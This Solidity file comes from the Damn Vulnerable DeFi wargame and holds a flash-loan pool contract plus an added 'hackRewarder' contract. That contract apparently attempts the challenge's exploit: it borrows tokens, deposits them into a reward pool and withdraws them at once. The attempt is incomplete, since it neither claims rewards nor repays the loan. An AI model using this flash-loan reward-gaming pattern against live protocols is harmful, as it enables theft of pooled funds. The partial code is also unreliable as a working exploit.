// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../DamnValuableToken.sol";
import "hardhat/console.sol";

/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)

 * @dev A simple pool to get flash loans of DVT
 */
contract FlashLoanerPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable liquidityToken;

    constructor(address liquidityTokenAddress) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
    }

    function flashLoan(uint256 amount) external nonReentrant {
        uint256 balanceBefore = liquidityToken.balanceOf(address(this));
        require(amount <= balanceBefore, "Not enough token balance");

        require(
            msg.sender.isContract(),
            "Borrower must be a deployed contract"
        );

        liquidityToken.transfer(msg.sender, amount);

        msg.sender.functionCall(
            abi.encodeWithSignature("receiveFlashLoan(uint256)", amount)
        );

        require(
            liquidityToken.balanceOf(address(this)) >= balanceBefore,
            "Flash loan not paid back"
        );
    }
}

interface IPool {
    function distributeRewards() external returns (uint256);

    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;
}

contract hackRewarder {
    address pool;

    constructor(address _pool) {
        pool = _pool;
    }

    function receiveFlashLoan(uint256 amount) public {
        console.log(
            ERC20(0x5FbDB2315678afecb367f032d93F642f64180aa3).balanceOf(
                address(this)
            )
        );

        IPool(pool).deposit(amount);

        IPool(pool).withdraw(amount);
    }
}
